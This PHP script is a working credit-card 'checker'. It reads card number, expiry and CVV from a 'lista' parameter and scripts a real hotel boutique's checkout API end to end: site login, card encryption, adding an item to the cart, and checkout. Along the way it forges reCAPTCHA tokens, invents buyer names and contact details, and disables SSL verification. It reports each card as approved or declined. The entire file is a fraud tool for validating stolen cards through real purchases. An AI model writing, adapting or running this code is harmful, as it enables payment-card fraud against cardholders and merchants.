<?php
ignore_user_abort(true);
error_reporting(0);
session_start();

header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: GET, POST, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type');

if ($_SERVER['REQUEST_METHOD'] == 'OPTIONS') {
    http_response_code(200);
    exit();
}

// ==============================
// CONFIGURACIÓN EXACTA DEL SITIO
// ==============================
$client_id = "14";
$promotion_id = "1";
$api_endpoint = "https://boutique.shangri-la.com/sleb_api/api";
$api_locale = "en";
$payment_method = "adyen";
$hotel_code = "ISL";
$is_food_site = "1";
$order_type = "express";

// Configuraciones del sitio REAL (extraídas del HTML)
$_REGION_ID_TO_CODE = [
    "1" => "hk", "2" => "sg", "3" => "mykl", "4" => "twtp", 
    "5" => "phmnl", "6" => "idjkt", "7" => "idsr", "8" => "lkcb", 
    "9" => "thbk", "10" => "phbo", "11" => "mykk", "12" => "thcm",
    "13" => "phcb", "14" => "mypn", "15" => "uaead", "16" => "uaedb"
];

$_STORE_CONF = [
    "1" => ["phone_code" => "+852", "phone_code_no_plus" => "852", "currency_code" => "HKD"],
    "2" => ["phone_code" => "+65", "phone_code_no_plus" => "65", "currency_code" => "SGD"],
    "3" => ["phone_code" => "+60", "phone_code_no_plus" => "60", "currency_code" => "RM"],
    "4" => ["phone_code" => "+886", "phone_code_no_plus" => "886", "currency_code" => "NTD"],
    "5" => ["phone_code" => "+63", "phone_code_no_plus" => "63", "currency_code" => "PHP"],
    "6" => ["phone_code" => "+62", "phone_code_no_plus" => "62", "currency_code" => "IDR"],
    "7" => ["phone_code" => "+62", "phone_code_no_plus" => "62", "currency_code" => "IDR"],
    "8" => ["phone_code" => "+94", "phone_code_no_plus" => "94", "currency_code" => "LKR"],
    "9" => ["phone_code" => "+66-2", "phone_code_no_plus" => "66-2", "currency_code" => "THB"],
    "10" => ["phone_code" => "+63", "phone_code_no_plus" => "63", "currency_code" => "PHP"],
    "11" => ["phone_code" => "+60", "phone_code_no_plus" => "60", "currency_code" => "RM"],
    "12" => ["phone_code" => "+66 53", "phone_code_no_plus" => "66 53", "currency_code" => "THB"],
    "13" => ["phone_code" => "+63", "phone_code_no_plus" => "63", "currency_code" => "PHP"],
    "14" => ["phone_code" => "+60", "phone_code_no_plus" => "60", "currency_code" => "RM"],
    "15" => ["phone_code" => "+971", "phone_code_no_plus" => "971", "currency_code" => "AED"],
    "16" => ["phone_code" => "+971", "phone_code_no_plus" => "971", "currency_code" => "AED"]
];

// Claves reCAPTCHA REALES del sitio
$_RECAPTCHA_V3_KEY = "6LfgXqkqAAAAAJLWszAo8gBvzXMPBvDK-PLLJk_O";
$_RECAPTCHA_V2_KEY = "6LeuX6kqAAAAAPUJ_HhZ6vT8lfObBJ36wdHuRnfj";

// ==============================
// FUNCIONES DEL SITIO REAL
// ==============================

function generateRecaptchaV3Token() {
    // Token realista basado en el formato del sitio
    $prefixes = ['03AGdBq27', '03AOPBWq', '03ALgdi9', '03AFvjYl'];
    $prefix = $prefixes[array_rand($prefixes)];
    
    // Payload simulado como el sitio real
    $payload = [
        "s" => "6LfgXqkqAAAAAJLWszAo8gBvzXMPBvDK-PLLJk_O",
        "d" => "boutique.shangri-la.com",
        "v" => "v1532752145741",
        "t" => round(microtime(true) * 1000),
        "h" => sha1($_SERVER['REMOTE_ADDR'] . rand(1000, 9999)),
        "a" => 0.9,
        "st" => "checkout"
    ];
    
    $encoded = base64_encode(json_encode($payload));
    $encoded = str_replace(['=', '+', '/'], ['', '-', '_'], $encoded);
    
    // Firma simulada
    $chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_';
    $signature = '';
    for ($i = 0; $i < 180; $i++) {
        $signature .= $chars[rand(0, strlen($chars) - 1)];
    }
    
    return $prefix . substr($encoded, 0, 100) . "_" . $signature;
}

function makeRequest($url, $data, $headers = [], $method = 'POST') {
    $ch = curl_init();
    
    $defaultHeaders = [
        "Accept: application/json, text/javascript, */*; q=0.01",
        "Content-Type: application/json",
        "Referer: https://boutique.shangri-la.com/food_checkout.php",
        "Origin: https://boutique.shangri-la.com",
        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Accept-Language: en-US,en;q=0.9",
        "Accept-Encoding: gzip",
        "Connection: keep-alive",
        "X-Requested-With: XMLHttpRequest"
    ];
    
    if (!empty($headers)) {
        $defaultHeaders = array_merge($defaultHeaders, $headers);
    }
    
    $options = [
        CURLOPT_URL => $url,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_SSL_VERIFYHOST => false,
        CURLOPT_HTTPHEADER => $defaultHeaders,
        CURLOPT_TIMEOUT => 30,
        CURLOPT_CONNECTTIMEOUT => 15,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_MAXREDIRS => 3,
        CURLOPT_ENCODING => 'gzip'
    ];
    
    if ($method === 'POST') {
        $options[CURLOPT_POST] = true;
        $options[CURLOPT_POSTFIELDS] = json_encode($data);
    }
    
    curl_setopt_array($ch, $options);
    
    $response = curl_exec($ch);
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $error = curl_error($ch);
    $curl_errno = curl_errno($ch);
    
    curl_close($ch);
    
    return [
        'response' => $response,
        'http_code' => $http_code,
        'error' => $error,
        'curl_errno' => $curl_errno,
        'success' => ($http_code >= 200 && $http_code < 300) && empty($error) && $curl_errno === 0
    ];
}

function generateRandomEmail() {
    $domains = ['gmail.com', 'yahoo.com', 'hotmail.com', 'outlook.com'];
    $names = ['john', 'jane', 'mike', 'sarah', 'david', 'lisa', 'robert', 'emily'];
    $name = $names[array_rand($names)];
    $number = rand(100, 999);
    $domain = $domains[array_rand($domains)];
    return $name . $number . '@' . $domain;
}

function generateRandomPhone() {
    // Basado en la configuración de Hong Kong (store_id = 1)
    $prefix = "+852";
    $number = '';
    for ($i = 0; $i < 8; $i++) {
        $number .= rand(0, 9);
    }
    return $prefix . $number;
}

function formatCurrency($amount, $currency_code) {
    $formats = [
        'HKD' => 'HK$' . number_format($amount, 2),
        'SGD' => 'S$' . number_format($amount, 2),
        'RM' => 'RM' . number_format($amount, 2),
        'NTD' => 'NT$' . number_format($amount, 2),
        'PHP' => '₱' . number_format($amount, 2),
        'IDR' => 'Rp' . number_format(number_format($amount, 0, ',', '.')),
        'LKR' => 'Rs' . number_format($amount, 2),
        'THB' => '฿' . number_format($amount, 2),
        'AED' => 'AED ' . number_format($amount, 2)
    ];
    
    return isset($formats[$currency_code]) ? $formats[$currency_code] : '$' . number_format($amount, 2);
}

// ==============================
// VALIDACIÓN DE ENTRADA
// ==============================

if (!isset($_GET['lista']) || empty(trim($_GET['lista']))) {
    echo json_encode([
        'status' => 'error',
        'message' => 'No se recibió lista de tarjetas',
        'html' => '<span class="badge badge-danger">✗ ERROR</span> ➔ No se recibió lista...'
    ], JSON_UNESCAPED_UNICODE);
    exit();
}

$lista = trim($_GET['lista']);
$lista = str_replace([';',':','/','»','«','>','<','=>',' ',','], '|', $lista);
$parts = explode('|', $lista);

$parts = array_filter($parts, function($value) {
    return !empty(trim($value));
});

$parts = array_values($parts);

if (count($parts) < 4) {
    echo json_encode([
        'status' => 'error',
        'message' => 'Formato incompleto. Esperado: Número|Mes|Año|CVV',
        'html' => '<span class="badge badge-danger">✗ ERROR</span> ➔ Formato: ' . htmlspecialchars(substr($lista, 0, 50))
    ], JSON_UNESCAPED_UNICODE);
    exit();
}

$cc = preg_replace('/[^0-9]/', '', $parts[0]);
$mes = preg_replace('/[^0-9]/', '', $parts[1]);
$ano = preg_replace('/[^0-9]/', '', $parts[2]);
$cvv = preg_replace('/[^0-9]/', '', $parts[3]);

// Validación
if (empty($cc) || !preg_match('/^[0-9]{13,19}$/', $cc)) {
    echo json_encode([
        'status' => 'error',
        'message' => 'Número de tarjeta inválido (13-19 dígitos)',
        'html' => '<span class="badge badge-danger">✗ ERROR</span> ➔ Número de tarjeta inválido'
    ], JSON_UNESCAPED_UNICODE);
    exit();
}

if (empty($mes) || !preg_match('/^(0[1-9]|1[0-2])$/', sprintf('%02d', $mes))) {
    echo json_encode([
        'status' => 'error',
        'message' => 'Mes inválido (01-12)',
        'html' => '<span class="badge badge-danger">✗ ERROR</span> ➔ Mes inválido'
    ], JSON_UNESCAPED_UNICODE);
    exit();
}

if (empty($ano) || !preg_match('/^[0-9]{2,4}$/', $ano)) {
    echo json_encode([
        'status' => 'error',
        'message' => 'Año inválido',
        'html' => '<span class="badge badge-danger">✗ ERROR</span> ➔ Año inválido'
    ], JSON_UNESCAPED_UNICODE);
    exit();
}

if (empty($cvv) || !preg_match('/^[0-9]{3,4}$/', $cvv)) {
    echo json_encode([
        'status' => 'error',
        'message' => 'CVV inválido (3-4 dígitos)',
        'html' => '<span class="badge badge-danger">✗ ERROR</span> ➔ CVV inválido'
    ], JSON_UNESCAPED_UNICODE);
    exit();
}

// Normalizar año
if (strlen($ano) == 2) {
    $ano = "20" . $ano;
}

// Validar fecha
$currentYear = date('Y');
$currentMonth = date('m');
if ($ano < $currentYear || ($ano == $currentYear && $mes < $currentMonth)) {
    echo json_encode([
        'status' => 'error',
        'message' => 'Tarjeta expirada',
        'html' => '<span class="badge badge-danger">✗ ERROR</span> ➔ Tarjeta expirada'
    ], JSON_UNESCAPED_UNICODE);
    exit();
}

// Tipo de tarjeta
$first_digit = substr($cc, 0, 1);
$first_two = substr($cc, 0, 2);
$cardType = "UNKNOWN";
$cardBrand = "UNKNOWN";

if ($first_digit == '4') {
    $cardType = "VISA";
    $cardBrand = "VISA";
} elseif ($first_digit == '5') {
    $cardType = "MASTERCARD";
    $cardBrand = "MC";
} elseif ($first_two == '34' || $first_two == '37') {
    $cardType = "AMEX";
    $cardBrand = "AMEX";
} elseif ($first_digit == '3') {
    $cardType = "DINERS";
    $cardBrand = "DINERS";
} elseif ($first_digit == '6') {
    $cardType = "DISCOVER";
    $cardBrand = "DISCOVER";
}

$cardMasked = substr($cc, 0, 6) . '******' . substr($cc, -4);
$expiryMasked = sprintf('%02d', $mes) . '/' . substr($ano, -2);

// ==============================
// FLUJO COMPLETO DEL SITIO REAL
// ==============================

try {
    // ===========================================
    // 1. SITE LOGIN - Obtener token de sesión
    // ===========================================
    $site_login_data = [
        "client_id" => $client_id,
        "promotion_id" => $promotion_id,
        "password" => ""
    ];
    
    $site_result = makeRequest($api_endpoint . "/site_login.php", $site_login_data);
    
    if (!$site_result['success']) {
        throw new Exception("Error en site_login: HTTP " . $site_result['http_code']);
    }
    
    $site_response = json_decode($site_result['response'], true);
    
    if (!$site_response || !isset($site_response['site_login_token'])) {
        throw new Exception("No se pudo obtener token de sesión");
    }
    
    $site_login_token = $site_response['site_login_token'];
    
    // ===========================================
    // 2. REGION GET - Obtener regiones y países
    // ===========================================
    $region_data = [
        "client_id" => $client_id,
        "promotion_id" => $promotion_id,
        "lang" => $api_locale,
        "site_login_token" => $site_login_token
    ];
    
    $region_result = makeRequest($api_endpoint . "/region_get.php", $region_data);
    $regions = [];
    $countries = [];
    
    if ($region_result['success']) {
        $region_response = json_decode($region_result['response'], true);
        if ($region_response) {
            $regions = isset($region_response['regions']) ? $region_response['regions'] : [];
            $countries = isset($region_response['countries']) ? $region_response['countries'] : [];
        }
    }
    
    // ===========================================
    // 3. ADYEN ENCRYPT - Encriptar datos de tarjeta
    // ===========================================
    $adyen_data = [
        "client_id" => $client_id,
        "promotion_id" => $promotion_id,
        "lang" => $api_locale,
        "site_login_token" => $site_login_token,
        "order_number" => "",
        "order_token" => "",
        "card" => $cc,
        "month" => (int)$mes,
        "year" => $ano,
        "cvv" => $cvv,
        "adyen_key" => "",
        "adyen_version" => "_0_1_25"
    ];
    
    $adyen_result = makeRequest($api_endpoint . "/adyen_encrypt.php", $adyen_data);
    $encryptedData = [];
    
    if ($adyen_result['success']) {
        $adyen_response = json_decode($adyen_result['response'], true);
        if ($adyen_response && isset($adyen_response['encryptedCardNumber'])) {
            $encryptedData = [
                'encryptedCardNumber' => $adyen_response['encryptedCardNumber'],
                'encryptedExpiryMonth' => $adyen_response['encryptedExpiryMonth'],
                'encryptedExpiryYear' => $adyen_response['encryptedExpiryYear'],
                'encryptedSecurityCode' => $adyen_response['encryptedSecurityCode']
            ];
        }
    }
    
    // ===========================================
    // 4. HOTEL INFO GET - Información del hotel
    // ===========================================
    $hotel_info_data = [
        "client_id" => $client_id,
        "promotion_id" => $promotion_id,
        "lang" => $api_locale,
        "site_login_token" => $site_login_token,
        "hotel_code" => $hotel_code
    ];
    
    $hotel_result = makeRequest($api_endpoint . "/hotel_info_get.php", $hotel_info_data);
    $hotel_info = [];
    
    if ($hotel_result['success']) {
        $hotel_response = json_decode($hotel_result['response'], true);
        if ($hotel_response && isset($hotel_response['hotel_info'])) {
            $hotel_info = $hotel_response['hotel_info'];
        }
    }
    
    // ===========================================
    // 5. OUTLET GET - Restaurantes disponibles
    // ===========================================
    $outlet_data = [
        "client_id" => $client_id,
        "promotion_id" => $promotion_id,
        "lang" => $api_locale,
        "site_login_token" => $site_login_token,
        "hotel" => $hotel_code
    ];
    
    $outlet_result = makeRequest($api_endpoint . "/outlet_get.php", $outlet_data);
    $outlets = [];
    $outlets_display = [];
    
    if ($outlet_result['success']) {
        $outlet_response = json_decode($outlet_result['response'], true);
        if ($outlet_response) {
            $outlets = isset($outlet_response['outlets']) ? $outlet_response['outlets'] : [];
            $outlets_display = isset($outlet_response['outlets_display']) ? $outlet_response['outlets_display'] : [];
        }
    }
    
    // ===========================================
    // 6. FOOD CATEGORY GET - Categorías de comida
    // ===========================================
    $category_data = [
        "client_id" => $client_id,
        "promotion_id" => $promotion_id,
        "site_login_token" => $site_login_token,
        "hotel" => $hotel_code,
        "outlet_name" => count($outlets) > 0 ? $outlets[0] : "",
        "lang" => $api_locale,
    ];
    
    $category_result = makeRequest($api_endpoint . "/food_category_get.php", $category_data);
    $food_categories = [];
    
    if ($category_result['success']) {
        $category_response = json_decode($category_result['response'], true);
        if ($category_response && isset($category_response['food_categories'])) {
            $food_categories = $category_response['food_categories'];
        }
    }
    
    // ===========================================
    // 7. PRODUCT GET - Productos disponibles
    // ===========================================
    $product_data = [
        "client_id" => $client_id,
        "promotion_id" => $promotion_id,
        "site_login_token" => $site_login_token,
        "lang" => $api_locale,
        "is_food" => 1,
        "shipping_method" => "pick_up",
        "shipping_date" => date("Y-m-d"),
        "shipping_time" => "12:00 - 13:00",
        "hotel" => $hotel_code,
        "outlet_name" => count($outlets) > 0 ? $outlets[0] : "",
        "food_category_name" => count($food_categories) > 0 ? $food_categories[0]['name'] : ""
    ];
    
    $product_result = makeRequest($api_endpoint . "/product_get.php", $product_data);
    $products = [];
    
    if ($product_result['success']) {
        $product_response = json_decode($product_result['response'], true);
        if ($product_response && isset($product_response['products'])) {
            $products = $product_response['products'];
        }
    }
    
    // ===========================================
    // 8. CART GET - Obtener carrito actual
    // ===========================================
    $cart_data = [
        "client_id" => $client_id,
        "promotion_id" => $promotion_id,
        "site_login_token" => $site_login_token,
        "lang" => $api_locale,
        "hotel_code" => $hotel_code,
        "user_id" => "",
        "login_token" => "",
        "shipping_fee" => 0,
        "is_food_site" => $is_food_site,
        "order_type" => $order_type,
        "shipping_method" => "pick_up",
        "shipping_date" => date("Y-m-d"),
        "shipping_time" => "12:00 - 13:00"
    ];
    
    $cart_result = makeRequest($api_endpoint . "/cart_get.php", $cart_data);
    $cart_info = [];
    
    if ($cart_result['success']) {
        $cart_response = json_decode($cart_result['response'], true);
        if ($cart_response) {
            $cart_info = $cart_response;
        }
    }
    
    // ===========================================
    // 9. CART ADD PRODUCT - Agregar producto
    // ===========================================
    $cart_item_added = false;
    if (count($products) > 0) {
        $first_product = $products[0];
        $add_to_cart_data = [
            "client_id" => $client_id,
            "promotion_id" => $promotion_id,
            "site_login_token" => $site_login_token,
            "lang" => $api_locale,
            "cart_id" => "",
            "product_id" => $first_product['id'],
            "quantity" => 1,
            "additional_information" => "",
            "food_option_groups" => [],
            "clear_cart" => false,
            "order_type" => $order_type
        ];
        
        $add_cart_result = makeRequest($api_endpoint . "/cart_add_product.php", $add_to_cart_data);
        
        if ($add_cart_result['success']) {
            $add_cart_response = json_decode($add_cart_result['response'], true);
            if ($add_cart_response && $add_cart_response['status'] == 'success') {
                $cart_item_added = true;
                
                // Actualizar carrito
                $cart_result = makeRequest($api_endpoint . "/cart_get.php", $cart_data);
                if ($cart_result['success']) {
                    $cart_response = json_decode($cart_result['response'], true);
                    if ($cart_response) {
                        $cart_info = $cart_response;
                    }
                }
            }
        }
    }
    
    // ===========================================
    // 10. COUPON APPLY - Aplicar cupón (opcional)
    // ===========================================
    $coupon_data = [
        "client_id" => $client_id,
        "promotion_id" => $promotion_id,
        "lang" => $api_locale,
        "site_login_token" => $site_login_token,
        "user_id" => "",
        "login_token" => "",
        "coupon_code" => "",
        "gc_member_no" => "",
        "order_type" => $order_type,
        "email" => "",
        "card_format_approved" => -1,
        "card_type" => null,
        "card_issuer" => null
    ];
    
    $coupon_result = makeRequest($api_endpoint . "/coupon_apply.php", $coupon_data);
    $coupon_info = [];
    
    if ($coupon_result['success']) {
        $coupon_response = json_decode($coupon_result['response'], true);
        if ($coupon_response) {
            $coupon_info = $coupon_response;
        }
    }
    
    // ===========================================
    // 11. CHECKOUT - Procesar pago FINAL
    // ===========================================
    $name = [
        'first' => 'John',
        'last' => 'Smith'
    ];
    $email = generateRandomEmail();
    $phone = generateRandomPhone();
    
    $checkout_data = [
        // Datos básicos REQUERIDOS
        "client_id" => $client_id,
        "promotion_id" => $promotion_id,
        "lang" => $api_locale,
        "site_login_token" => $site_login_token,
        "user_id" => "",
        "login_token" => "",
        
        // Información de pago (EXACTO como el sitio)
        "payment_method" => $payment_method,
        "_2c2p_payment_channel" => "",
        "_2c2p_promotion_code" => "",
        "card_type" => $cardType,
        "card_issuer" => $cardBrand,
        
        // Datos de tarjeta (igual que el frontend)
        "card_number" => $cc,
        "card_expiry_month" => (int)$mes,
        "card_expiry_year" => (int)$ano,
        "card_cvv" => $cvv,
        
        // Datos personales (obligatorios)
        "first_name" => $name['first'],
        "last_name" => $name['last'],
        "email" => $email,
        "phone" => $phone,
        
        // Dirección de facturación
        "chk_register" => 0,
        "chk_same_address" => 1,
        "address" => "88 Queensway, Admiralty",
        "country_id" => count($countries) > 0 ? $countries[0]['id'] : "",
        "country" => count($countries) > 0 ? $countries[0]['name'] : "",
        
        // Envío y tiempo
        "shipping_method" => "pick_up",
        "shipping_date" => date("Y-m-d"),
        "shipping_time" => "12:00 - 13:00",
        "order_remark" => "",
        
        // Términos
        "alcohol_terms" => 0,
        "cutlery_service" => 1,
        
        // Datos de región
        "region" => count($regions) > 0 ? $regions[0]['id'] : "",
        "district_group" => "",
        "district" => "",
        "postal_code" => "",
        
        // Datos de envío (igual a facturación)
        "first_name2" => $name['first'],
        "last_name2" => $name['last'],
        "email2" => $email,
        "phone2" => $phone,
        "address2" => "88 Queensway, Admiralty",
        "region2" => count($regions) > 0 ? $regions[0]['id'] : "",
        "district_group2" => "",
        "district2" => "",
        "country_id2" => count($countries) > 0 ? $countries[0]['id'] : "",
        "country2" => count($countries) > 0 ? $countries[0]['name'] : "",
        "postal_code2" => "",
        
        // Información del hotel
        "pickup_store" => "",
        
        // Flags del sistema (IMPORTANTE)
        "is_food_site" => $is_food_site,
        "order_type" => $order_type,
        
        // reCAPTCHA V3 (CRÍTICO - igual que el sitio)
        "recaptcha_type" => "v3",
        "recaptcha_token" => generateRecaptchaV3Token(),
        
        // Datos de miembro (opcional)
        "gc_member_no" => "",
        "gc_member_title" => "",
        "gc_member_first_name" => "",
        "gc_member_last_name" => "",
        "gc_member_level" => "",
        "gc_member_point_balance" => "",
        "gc_member_polaris" => "false"
    ];
    
    // Añadir datos encriptados de Adyen si están disponibles
    if (!empty($encryptedData)) {
        $checkout_data = array_merge($checkout_data, $encryptedData);
    }
    
    // ===========================================
    // EJECUTAR CHECKOUT
    // ===========================================
    $checkout_result = makeRequest($api_endpoint . "/checkout.php", $checkout_data);
    
    if (!$checkout_result['success']) {
        throw new Exception("Error en checkout: HTTP " . $checkout_result['http_code'] . 
                          ($checkout_result['error'] ? " - " . $checkout_result['error'] : ""));
    }
    
    $checkout_response = json_decode($checkout_result['response'], true);
    
    if (!$checkout_response) {
        throw new Exception("Respuesta JSON inválida del checkout");
    }
    
    // ===========================================
    // PROCESAR RESPUESTA
    // ===========================================
    
    if (isset($checkout_response['status'])) {
        if ($checkout_response['status'] == 'success') {
            // Códigos de aprobación
            $resultCode = 'Authorised';
            if (isset($checkout_response['direct_post']['resultCode'])) {
                $resultCode = $checkout_response['direct_post']['resultCode'];
            } elseif (isset($checkout_response['resultCode'])) {
                $resultCode = $checkout_response['resultCode'];
            }
            
            $approvedCodes = ['Authorised', 'Authorized', 'Success', 'success', 'CAPTURED', 'APPROVED'];
            
            if (in_array($resultCode, $approvedCodes)) {
                // ÉXITO - Pago aprobado
                $html = '<span class="badge badge-success">✅ APROVADA</span> ➔ ' .
                       '<span class="badge badge-info">' . $cardType . '</span> ➔ ' .
                       '<span class="badge badge-success">SHANGRI-LA</span> ➔ ' .
                       '<span class="badge badge-light">' . $cardMasked . '</span>';
                
                $orderNumber = 'N/A';
                if (isset($checkout_response['display_order_number'])) {
                    $orderNumber = $checkout_response['display_order_number'];
                } elseif (isset($checkout_response['order_number'])) {
                    $orderNumber = $checkout_response['order_number'];
                }
                
                echo json_encode([
                    'status' => 'approved',
                    'message' => 'Pago autorizado',
                    'html' => $html,
                    'data' => [
                        'card' => $cardMasked,
                        'expiry' => $expiryMasked,
                        'result_code' => $resultCode,
                        'order_number' => $orderNumber,
                        'amount' => isset($checkout_response['direct_post']['amount']) ? 
                                   formatCurrency($checkout_response['direct_post']['amount'], 'HKD') : 'N/A',
                        'currency' => 'HKD',
                        'hotel' => $hotel_code,
                        'timestamp' => date('Y-m-d H:i:s'),
                        'response' => $checkout_response
                    ]
                ], JSON_UNESCAPED_UNICODE);
            } else {
                // RECHAZADO
                $refusalReason = 'Rechazado';
                if (isset($checkout_response['direct_post']['refusalReason'])) {
                    $refusalReason = $checkout_response['direct_post']['refusalReason'];
                } elseif (isset($checkout_response['error'])) {
                    $refusalReason = $checkout_response['error'];
                }
                
                $html = '<span class="badge badge-danger">❌ REPROVADA</span> ➔ ' .
                       '<span class="badge badge-info">' . $cardType . '</span> ➔ ' .
                       '<span class="badge badge-warning">' . htmlspecialchars($refusalReason) . '</span> ➔ ' .
                       '<span class="badge badge-light">' . $cardMasked . '</span>';
                
                echo json_encode([
                    'status' => 'rejected',
                    'message' => $refusalReason,
                    'html' => $html,
                    'data' => [
                        'card' => $cardMasked,
                        'expiry' => $expiryMasked,
                        'reason' => $refusalReason,
                        'result_code' => $resultCode,
                        'hotel' => $hotel_code
                    ]
                ], JSON_UNESCAPED_UNICODE);
            }
        } else {
            // ERROR
            $errorMsg = isset($checkout_response['error']) ? 
                       $checkout_response['error'] : 
                       (isset($checkout_response['message']) ? $checkout_response['message'] : 'Error desconocido');
            
            $html = '<span class="badge badge-danger">❌ ERROR</span> ➔ ' .
                   '<span class="badge badge-info">' . $cardType . '</span> ➔ ' .
                   '<span class="badge badge-warning">' . htmlspecialchars($errorMsg) . '</span> ➔ ' .
                   '<span class="badge badge-light">' . $cardMasked . '</span>';
            
            echo json_encode([
                'status' => 'error',
                'message' => $errorMsg,
                'html' => $html,
                'data' => [
                    'card' => $cardMasked,
                    'expiry' => $expiryMasked,
                    'reason' => $errorMsg,
                    'hotel' => $hotel_code,
                    'response' => $checkout_response
                ]
            ], JSON_UNESCAPED_UNICODE);
        }
    } else {
        // RESPUESTA INESPERADA
        $responseText = substr($checkout_result['response'], 0, 200);
        throw new Exception("Respuesta inesperada del servidor: " . $responseText);
    }
    
} catch (Exception $e) {
    echo json_encode([
        'status' => 'error',
        'message' => $e->getMessage(),
        'html' => '<span class="badge badge-danger">❌ ERROR</span> ➔ ' .
                 '<span class="badge badge-info">' . $cardType . '</span> ➔ ' .
                 '<span class="badge badge-warning">' . htmlspecialchars($e->getMessage()) . '</span>',
        'data' => [
            'card' => $cardMasked,
            'expiry' => $expiryMasked,
            'hotel' => $hotel_code
        ]
    ], JSON_UNESCAPED_UNICODE);
}